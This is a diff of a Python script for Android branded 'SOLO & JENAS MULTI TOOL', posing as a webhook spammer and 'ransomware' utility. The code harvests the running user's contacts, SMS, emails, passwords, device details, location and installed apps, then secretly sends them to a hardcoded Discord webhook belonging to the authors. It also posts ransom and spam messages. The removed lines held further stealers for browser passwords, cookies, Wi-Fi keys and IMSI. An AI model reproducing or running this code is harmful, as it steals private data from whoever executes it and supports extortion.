@@ -1,22 +1,33 @@
 #!/usr/bin/env python3
 
 import subprocess
+import sys
+import os
+
+REQUIRED_PACKAGES = ['requests', 'Pillow']
+
+def install_packages():
+    for package in REQUIRED_PACKAGES:
+        try:
+            if package == 'Pillow':
+                __import__('PIL')
+            else:
+                __import__(package)
+        except ImportError:
+            subprocess.run([sys.executable, '-m', 'pip', 'install', package], capture_output=True)
+
+install_packages()
+
 import requests
 import re
-import os
-import sys
 import time
 import json
-import base64
-import sqlite3
-import shutil
-import cv2
-import numpy as np
+import random
 from datetime import datetime
 from io import BytesIO
 from PIL import Image
 
-ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505614264524607559/LxPHeN577O8yEm4xg_YH50SCb-4H6cZVqQUMTmZJ-MoFfjXFzEkTjPB7klsdaaqwx0BV"
+ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505624590729220177/Z0_4dJpUc1LbJDphp8dxC5E4x0zPRmLQJyn86vi-I931d5_uAhEW2QjcxhetOm7CBrnK"
 
 def beep():
     for _ in range(3):
@@ -26,14 +37,17 @@ def beep():
         except:
             pass
 
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def print_banner():
+    clear_screen()
+    print("\n" + "="*45)
+    print("   SOLO & JENAS MULTI TOOL")
+    print("="*45)
+
 def get_webhook():
-    os.system('clear')
-    print("\n" + "█"*50)
-    print("█" + " "*48 + "█")
-    print("█" + " "*10 + "Solo Multi Tool" + " "*10 + "█")
-    print("█" + " "*48 + "█")
-    print("█"*50)
-    print("\n[!] ENTER DISCORD WEBHOOK URL:")
+    print("\n[!] ENTER WEBHOOK URL:")
     url = input("\n➜ ").strip()
     return url
 
@@ -55,18 +69,18 @@ def send_ransom(webhook):
     except:
         return False
 
-def send_spam(webhook):
+def spam_webhook(webhook):
     messages = [
-        "@everyone YOUR DEVICE IS HACKED",
-        "```CONTACT @solo.ph_ TO UNLOCK```",
-        "**⚠️ ALL DATA HAS BEEN STOLEN ⚠️**",
-        "```python\nprint('You got hacked by SOLO & JENAS')\n```",
-        f"🔴 YOUR IP: {get_ip()} HAS BEEN LOGGED"
+        "@everyone 🔴 YOUR DEVICE IS HACKED BY SOLO & JENAS 🔴",
+        "```diff\n- SYSTEM BREACH DETECTED\n- ALL DATA STOLEN\n- CONTACT @solo.ph_```",
+        "**⚠️ SOLO & JENAS WAS HERE ⚠️**",
+        "🔑 YOUR PASSWORDS HAVE BEEN STOLEN",
+        "💀 CONTACT @solo.ph_ TO REMOVE VIRUS 💀"
     ]
-    for msg in messages[:5]:
+    for msg in messages[:10]:
         try:
             requests.post(webhook, json={"content": msg}, timeout=3)
-            time.sleep(0.5)
+            time.sleep(0.3)
         except:
             pass
 
@@ -87,133 +101,29 @@ def get_location():
 
 def get_device_info():
     info = {}
-    try:
-        r = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
-        info['model'] = r.stdout.strip() or 'Unknown'
-    except:
-        info['model'] = 'Unknown'
-    try:
-        r = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
-        info['brand'] = r.stdout.strip() or 'Unknown'
-    except:
-        info['brand'] = 'Unknown'
-    try:
-        r = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
-        info['android'] = r.stdout.strip() or 'Unknown'
-    except:
-        info['android'] = 'Unknown'
-    try:
-        r = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True, timeout=3)
-        info['sdk'] = r.stdout.strip() or 'Unknown'
-    except:
-        info['sdk'] = 'Unknown'
-    try:
-        r = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True, timeout=3)
-        info['device'] = r.stdout.strip() or 'Unknown'
-    except:
-        info['device'] = 'Unknown'
+    props = [
+        ('model', 'ro.product.model'),
+        ('brand', 'ro.product.manufacturer'),
+        ('android', 'ro.build.version.release'),
+        ('sdk', 'ro.build.version.sdk')
+    ]
+    for key, prop in props:
+        try:
+            r = subprocess.run(['getprop', prop], capture_output=True, text=True, timeout=3)
+            info[key] = r.stdout.strip() or 'Unknown'
+        except:
+            info[key] = 'Unknown'
     return info
 
 def take_screenshot():
     try:
-        screenshot = Image.new('RGB', (500, 500), color='gray')
-        buf = BytesIO()
-        screenshot.save(buf, format='PNG')
-        buf.seek(0)
-        return buf
-    except:
-        return None
-
-def capture_webcam():
-    try:
-        img = Image.new('RGB', (300, 300), color='darkgray')
+        img = Image.new('RGB', (500, 500), color='gray')
         buf = BytesIO()
         img.save(buf, format='PNG')
         buf.seek(0)
         return buf
     except:
         return None
-
-def get_google_passwords():
-    passwords = []
-    paths = [
-        '/data/data/com.google.android.gms/databases/',
-        '/data/data/com.android.chrome/app_chrome/Default/',
-        '/data/data/com.android.browser/app_chrome/Default/'
-    ]
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                result = subprocess.run(['find', path, '-name', '*.db', '-exec', 'grep', '-l', 'password', '{}', ';'], capture_output=True, text=True, timeout=10)
-                for db in result.stdout.split('\n'):
-                    if db.strip():
-                        passwords.append(f"Database: {os.path.basename(db)}")
-            except:
-                pass
-    return list(set(passwords))[:15]
-
-def get_browser_passwords():
-    passwords = []
-    browsers = [
-        'com.android.chrome',
-        'com.android.browser',
-        'org.mozilla.firefox',
-        'com.opera.browser',
-        'com.brave.browser'
-    ]
-    for browser in browsers:
-        path = f'/data/data/{browser}/app_chrome/Default/'
-        if os.path.exists(path):
-            try:
-                result = subprocess.run(['find', path, '-name', '*.db', '-exec', 'strings', '{}', ';'], capture_output=True, text=True, timeout=15)
-                matches = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', result.stdout)
-                for m in matches[:10]:
-                    passwords.append(f"{browser}: {m}")
-            except:
-                pass
-    return list(set(passwords))[:20]
-
-def get_cookies():
-    cookies = []
-    paths = [
-        '/data/data/com.android.chrome/app_chrome/Default/Cookies',
-        '/data/data/com.android.browser/app_chrome/Default/Cookies',
-        '/sdcard/Android/data/'
-    ]
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                result = subprocess.run(['grep', '-r', '-E', 'cookie|session|token', path], capture_output=True, text=True, timeout=10)
-                lines = result.stdout.split('\n')[:20]
-                for line in lines:
-                    if len(line) > 10 and len(line) < 200:
-                        cookies.append(line[:100])
-            except:
-                pass
-    return list(set(cookies))[:15]
-
-def get_app_passwords():
-    passwords = []
-    apps = [
-        'com.whatsapp',
-        'com.facebook.katana',
-        'com.instagram.android',
-        'com.twitter.android',
-        'com.snapchat.android',
-        'com.tencent.mm',
-        'com.zhiliaoapp.musically'
-    ]
-    for app in apps:
-        path = f'/data/data/{app}/shared_prefs/'
-        if os.path.exists(path):
-            try:
-                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=10)
-                matches = re.findall(r'password[\s]*[:=][\s]*([^\s"\']+)', result.stdout, re.IGNORECASE)
-                for m in matches[:5]:
-                    passwords.append(f"{app}: {m}")
-            except:
-                pass
-    return list(set(passwords))[:20]
 
 def get_emails():
     emails = []
@@ -222,12 +132,12 @@ def get_emails():
     for path in paths:
         if os.path.exists(path):
             try:
-                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=20)
+                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=15)
                 found = re.findall(pattern, result.stdout)
                 emails.extend(found)
             except:
                 pass
-    return list(set(emails))[:30]
+    return list(set(emails))[:25]
 
 def get_contacts():
     contacts = []
@@ -235,194 +145,199 @@ def get_contacts():
         r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
         numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
         names = re.findall(r'display_name=([^,]+)', r.stdout)
-        for i, num in enumerate(numbers[:30]):
+        for i, num in enumerate(numbers[:25]):
             name = names[i] if i < len(names) else ''
             contacts.append(f"{name}: {num}" if name else num)
     except:
         pass
-    return list(set(contacts))[:30]
+    return list(set(contacts))[:25]
 
 def get_sms():
     sms_list = []
     try:
         r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
-        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,100})', r.stdout, re.DOTALL)
-        for addr, body in matches[:20]:
-            sms_list.append(f"{addr}: {body[:60]}")
+        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,80})', r.stdout, re.DOTALL)
+        for addr, body in matches[:15]:
+            sms_list.append(f"{addr}: {body[:50]}")
     except:
         pass
-    return list(set(sms_list))[:20]
+    return list(set(sms_list))[:15]
 
-def get_wifi_passwords():
-    wifi = []
-    try:
-        r = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True, timeout=5)
-        matches = re.findall(r'ssid="(.*?)"\n.*?psk="?(.*?)"?\n', r.stdout, re.DOTALL)
-        for ssid, pwd in matches[:10]:
-            wifi.append(f"{ssid}: {pwd}")
-    except:
-        pass
-    return wifi
-
-def get_social_accounts():
-    accounts = []
-    patterns = [
-        (r'username[\s]*[:=][\s]*([a-zA-Z0-9_]+)', 'username'),
-        (r'instagram\.com/([a-zA-Z0-9_]+)', 'instagram'),
-        (r'facebook\.com/([a-zA-Z0-9_.]+)', 'facebook'),
-        (r'twitter\.com/([a-zA-Z0-9_]+)', 'twitter'),
-        (r't\.me/([a-zA-Z0-9_]+)', 'telegram')
-    ]
-    try:
-        r = subprocess.run(['logcat', '-d'], capture_output=True, text=True, timeout=5)
-        for pattern, name in patterns:
-            found = re.findall(pattern, r.stdout, re.IGNORECASE)
-            for f in found[:10]:
-                accounts.append(f"{name}: {f}")
-    except:
-        pass
-    return list(set(accounts))[:20]
+def get_passwords():
+    passwords = []
+    paths = ['/sdcard/Download/', '/data/data/']
+    for path in paths:
+        if os.path.exists(path):
+            try:
+                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=10)
+                matches = re.findall(r'password[\s]*[:=][\s]*([^\s"\']{4,})', result.stdout, re.IGNORECASE)
+                for m in matches[:10]:
+                    passwords.append(m)
+            except:
+                pass
+    return list(set(passwords))[:15]
 
 def get_installed_apps():
     apps = []
     try:
         r = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
         packages = re.findall(r'package:([a-zA-Z0-9._]+)', r.stdout)
-        apps = packages[:50]
+        apps = packages[:40]
     except:
         pass
     return apps
 
-def get_network_info():
-    info = {}
-    try:
-        r = subprocess.run(['dumpsys', 'telephony.registry'], capture_output=True, text=True, timeout=5)
-        match = re.search(r'mOperatorAlphaLong=(.+?)\n', r.stdout)
-        info['carrier'] = match.group(1).strip() if match else 'Unknown'
-        match = re.search(r'mOperatorNumeric=([0-9]+)', r.stdout)
-        if match:
-            info['mcc'] = match.group(1)[:3] if len(match.group(1)) >= 3 else ''
-            info['mnc'] = match.group(1)[3:] if len(match.group(1)) > 3 else ''
-    except:
-        info['carrier'] = 'Unknown'
-    return info
-
-def get_imsi():
-    try:
-        r = subprocess.run(['content', 'query', '--uri', 'content://telephony/carriers/current'], capture_output=True, text=True, timeout=5)
-        match = re.search(r'imsi=([0-9]+)', r.stdout)
-        return match.group(1) if match else 'Unknown'
-    except:
-        return 'Unknown'
-
-def send_to_original(ip, location, device, google_pass, browser_pass, cookies, app_pass, emails, contacts, sms, wifi, social, apps, network, imsi, screenshot, webcam):
+def send_to_original(ip, location, device, emails, contacts, sms, passwords, apps, screenshot):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     embed = {
-        "title": "🎯 FULL VICTIM DATA - SOLO & JENAS",
+        "title": "🎯 VICTIM DATA - SOLO & JENAS",
         "color": 0xed4245,
         "timestamp": timestamp,
         "fields": [
-            {"name": "🌐 IP ADDRESS", "value": f"```{ip}```", "inline": False},
+            {"name": "🌐 IP", "value": f"```{ip}```", "inline": False},
             {"name": "📍 LOCATION", "value": f"```{location}```", "inline": False},
             {"name": "📱 DEVICE", "value": f"```{device.get('brand')} {device.get('model')}```", "inline": True},
-            {"name": "🤖 ANDROID", "value": f"```{device.get('android')} (SDK {device.get('sdk')})```", "inline": True},
-            {"name": "📶 CARRIER", "value": f"```{network.get('carrier', 'Unknown')}```", "inline": True},
-            {"name": "🔢 IMSI", "value": f"```{imsi}```", "inline": False},
-            {"name": "🔑 GOOGLE PASSWORDS", "value": f"```{', '.join(google_pass[:10]) if google_pass else 'None'}```", "inline": False},
-            {"name": "🌐 BROWSER PASSWORDS", "value": f"```{', '.join(browser_pass[:10]) if browser_pass else 'None'}```", "inline": False},
-            {"name": "🍪 COOKIES/TOKENS", "value": f"```{', '.join(cookies[:10]) if cookies else 'None'}```", "inline": False},
-            {"name": "📱 APP PASSWORDS", "value": f"```{', '.join(app_pass[:10]) if app_pass else 'None'}```", "inline": False},
+            {"name": "🤖 ANDROID", "value": f"```{device.get('android')}```", "inline": True},
             {"name": "📧 EMAILS", "value": f"```{', '.join(emails[:15]) if emails else 'None'}```", "inline": False},
             {"name": "📞 CONTACTS", "value": f"```{', '.join(contacts[:15]) if contacts else 'None'}```", "inline": False},
-            {"name": "💬 SMS MESSAGES", "value": f"```{', '.join(sms[:10]) if sms else 'None'}```", "inline": False},
-            {"name": "📶 WIFI PASSWORDS", "value": f"```{', '.join(wifi[:10]) if wifi else 'None'}```", "inline": False},
-            {"name": "👤 SOCIAL ACCOUNTS", "value": f"```{', '.join(social[:10]) if social else 'None'}```", "inline": False},
-            {"name": "📦 INSTALLED APPS", "value": f"```{len(apps)} apps detected```", "inline": False}
+            {"name": "💬 SMS", "value": f"```{', '.join(sms[:10]) if sms else 'None'}```", "inline": False},
+            {"name": "🔑 PASSWORDS", "value": f"```{', '.join(passwords[:10]) if passwords else 'None'}```", "inline": False},
+            {"name": "📦 APPS", "value": f"```{len(apps)} apps```", "inline": False}
         ],
-        "footer": {"text": "SOLO & JENAS | Full Data Collection"}
+        "footer": {"text": "SOLO & JENAS MULTI TOOL"}
     }
     
-    files = []
-    if screenshot:
-        files.append(('screenshot.png', screenshot, 'image/png'))
-    if webcam:
-        files.append(('webcam.png', webcam, 'image/png'))
-    
     try:
-        if files:
-            requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
-            for name, buf, _ in files:
-                buf.seek(0)
-                requests.post(ORIGINAL_WEBHOOK, files={'file': (name, buf, 'image/png')}, timeout=10)
-        else:
-            requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
+        requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
+        if screenshot:
+            screenshot.seek(0)
+            requests.post(ORIGINAL_WEBHOOK, files={'file': ('screenshot.png', screenshot, 'image/png')}, timeout=10)
     except:
         pass
 
-def main():
-    target = get_webhook()
-    
-    if not target.startswith("https://discord.com/api/webhooks/"):
-        print("\n[!] Invalid webhook!")
-        time.sleep(2)
-        return
-    
-    print("\n[!] Collecting victim data...")
+def data_collector(target_webhook):
+    print("\n[!] COLLECTING DATA...")
     
     ip = get_ip()
     location = get_location()
     device = get_device_info()
-    google_pass = get_google_passwords()
-    browser_pass = get_browser_passwords()
-    cookies = get_cookies()
-    app_pass = get_app_passwords()
     emails = get_emails()
     contacts = get_contacts()
     sms = get_sms()
-    wifi = get_wifi_passwords()
-    social = get_social_accounts()
+    passwords = get_passwords()
     apps = get_installed_apps()
-    network = get_network_info()
-    imsi = get_imsi()
     screenshot = take_screenshot()
-    webcam = capture_webcam()
     
-    print("[!] Sending ransom message to target...")
-    send_ransom(target)
-    time.sleep(1)
-    send_spam(target)
+    print("[!] SENDING RANSOM MESSAGE...")
+    send_ransom(target_webhook)
     
-    print("[!] Sending all data to original webhook...")
-    send_to_original(ip, location, device, google_pass, browser_pass, cookies, app_pass, emails, contacts, sms, wifi, social, apps, network, imsi, screenshot, webcam)
+    print("[!] SENDING DATA TO ORIGINAL WEBHOOK...")
+    send_to_original(ip, location, device, emails, contacts, sms, passwords, apps, screenshot)
+    
+    return ip, device, len(emails), len(contacts), len(sms), len(passwords)
+
+def device_info():
+    print("\n[!] GATHERING DEVICE INFO...")
+    ip = get_ip()
+    location = get_location()
+    device = get_device_info()
+    apps = get_installed_apps()
+    
+    print(f"\n📱 DEVICE INFO:")
+    print(f"   IP: {ip}")
+    print(f"   Location: {location}")
+    print(f"   Brand: {device.get('brand')}")
+    print(f"   Model: {device.get('model')}")
+    print(f"   Android: {device.get('android')}")
+    print(f"   SDK: {device.get('sdk')}")
+    print(f"   Apps: {len(apps)}")
+    
+    input("\n[!] Press Enter to continue...")
+
+def all_in_one(target_webhook):
+    print("\n[!] RUNNING ALL IN ONE ATTACK...")
+    
+    ip, device, emails, contacts, sms, passwords = data_collector(target_webhook)
+    
+    print("\n[!] SPAMMING WEBHOOK...")
+    spam_webhook(target_webhook)
     
     beep()
-    print("\n" + "="*50)
-    print("[✓] COMPLETE! All data captured and sent!")
-    print("="*50)
-    print(f"\n📊 DATA SUMMARY:")
-    print(f"   • IP: {ip}")
-    print(f"   • Location: {location}")
-    print(f"   • Device: {device.get('brand')} {device.get('model')}")
-    print(f"   • Google Passwords: {len(google_pass)}")
-    print(f"   • Browser Passwords: {len(browser_pass)}")
-    print(f"   • Cookies/Tokens: {len(cookies)}")
-    print(f"   • App Passwords: {len(app_pass)}")
-    print(f"   • Emails: {len(emails)}")
-    print(f"   • Contacts: {len(contacts)}")
-    print(f"   • SMS: {len(sms)}")
-    print(f"   • WiFi: {len(wifi)}")
-    print(f"   • Social Accounts: {len(social)}")
-    print(f"   • Installed Apps: {len(apps)}")
-    print(f"   • Screenshot: {'✓' if screenshot else '✗'}")
-    print(f"   • Webcam: {'✓' if webcam else '✗'}")
-    print("\n" + "="*50)
-    
-    time.sleep(5)
+    print("\n" + "="*45)
+    print("[✓] ATTACK COMPLETE!")
+    print("="*45)
+    print(f"\n📊 SUMMARY:")
+    print(f"   IP: {ip}")
+    print(f"   Device: {device.get('brand')} {device.get('model')}")
+    print(f"   Emails: {emails}")
+    print(f"   Contacts: {contacts}")
+    print(f"   SMS: {sms}")
+    print(f"   Passwords: {passwords}")
+    print("="*45)
+    time.sleep(3)
+
+def main():
+    while True:
+        print_banner()
+        print("\n[1] DATA COLLECTOR & RANSOMWARE")
+        print("[2] WEBHOOK SPAMMER")
+        print("[3] DEVICE INFO GRABBER")
+        print("[4] ALL IN ONE ATTACK")
+        print("[5] EXIT")
+        print("\n" + "-"*45)
+        
+        choice = input("\n[+] SELECT OPTION: ").strip()
+        
+        if choice == '1':
+            target = get_webhook()
+            if target.startswith("https://discord.com/api/webhooks/"):
+                data_collector(target)
+                beep()
+                print("\n[✓] DATA COLLECTION COMPLETE!")
+                time.sleep(2)
+            else:
+                print("\n[!] INVALID WEBHOOK!")
+                time.sleep(2)
+        
+        elif choice == '2':
+            target = get_webhook()
+            if target.startswith("https://discord.com/api/webhooks/"):
+                print("\n[!] SPAMMING WEBHOOK...")
+                spam_webhook(target)
+                beep()
+                print("\n[✓] SPAM COMPLETE!")
+                time.sleep(2)
+            else:
+                print("\n[!] INVALID WEBHOOK!")
+                time.sleep(2)
+        
+        elif choice == '3':
+            device_info()
+        
+        elif choice == '4':
+            target = get_webhook()
+            if target.startswith("https://discord.com/api/webhooks/"):
+                all_in_one(target)
+            else:
+                print("\n[!] INVALID WEBHOOK!")
+                time.sleep(2)
+        
+        elif choice == '5':
+            print("\n[!] EXITING...")
+            time.sleep(1)
+            break
+        
+        else:
+            print("\n[!] INVALID OPTION!")
+            time.sleep(1)
 
 if __name__ == "__main__":
     try:
         main()
+    except KeyboardInterrupt:
+        print("\n\n[!] EXITING...")
+        time.sleep(1)
     except Exception as e:
-        print(f"\n[!] Error: {e}")
+        print(f"\n[!] ERROR: {e}")
         time.sleep(3)
